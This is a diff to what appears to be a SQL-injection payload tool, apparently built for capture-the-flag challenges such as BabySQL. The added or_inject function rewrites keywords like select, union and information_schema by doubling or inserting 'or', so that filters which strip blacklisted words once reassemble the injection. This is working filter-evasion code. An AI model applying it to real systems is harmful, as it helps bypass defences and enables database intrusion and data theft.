@@ -203,9 +203,57 @@ def apply_form(core: str, form: str) -> str:
         return space2comment(core)
     if form == "tab":
         return tabify(core)
+    if form == "orinject":
+        return or_inject(core)
     return core
 
 
 def form_sep(form: str) -> str:
     """数字型（无闭合引号）时 pre 与关键字核心之间的形态分隔符。"""
-    return {"classic": " ", "inline": "/**/", "tab": "\t", "paren": "\t"}.get(form, " ")
+    return {"classic": " ", "inline": "/**/", "tab": "\t", "paren": "\t",
+            "orinject": " "}.get(form, " ")
+
+
+# ---------------------------------------------------------------------------
+# or 双写（BabySQL 类单次 str_replace 剥离环境）
+# ---------------------------------------------------------------------------
+_OR_INJECT_KW = (
+    "information_schema", "performance_schema", "select", "update",
+    "delete", "insert", "drop", "union", "where", "from", "and", "or",
+)
+
+
+def or_inject(sql: str, extra_kws: tuple = ()) -> str:
+    """BabySQL 类单次 str_replace 剥离环境的统一保护变换。
+
+    str_replace 会删除**所有**出现的黑名单子串，因此：
+    - 含 or 的词（information/performance/password）：所有 or 双写为 oorr
+      （删除一处后恰好还原，题解 infoorrmation 验证）；
+    - 不含 or 的黑名单关键字（select/union/where/...）：中部插入单个 or
+      （seleorct → 剥离 → select）；
+    - 要求 or 的剥离发生在其他关键字之后（BabySQL 验证的顺序）。
+    extra_kws：运行时由 WAF 报告补充的被剥字母关键字（如 substr/sleep）。
+    """
+    import re as _re
+
+    def _protect(seg: str) -> str:
+        if "or" in seg.lower():
+            return _re.sub("or", "oorr", seg, flags=_re.I)
+        mid = max(1, len(seg) // 2)
+        return seg[:mid] + "or" + seg[mid:]
+
+    kws = set(_OR_INJECT_KW) | {k for k in extra_kws
+                                if k and k.replace("_", "").isalpha()}
+    low = sql.lower()
+    hits, taken = [], []
+    for K in sorted(kws, key=len, reverse=True):
+        start = 0
+        while (idx := low.find(K, start)) != -1:
+            s, e = idx, idx + len(K)
+            if not any(s < te and ts < e for ts, te in taken):
+                taken.append((s, e))
+                hits.append((s, e))
+            start = idx + 1
+    for s, e in sorted(hits, reverse=True):
+        sql = sql[:s] + _protect(sql[s:e]) + sql[e:]
+    return sql
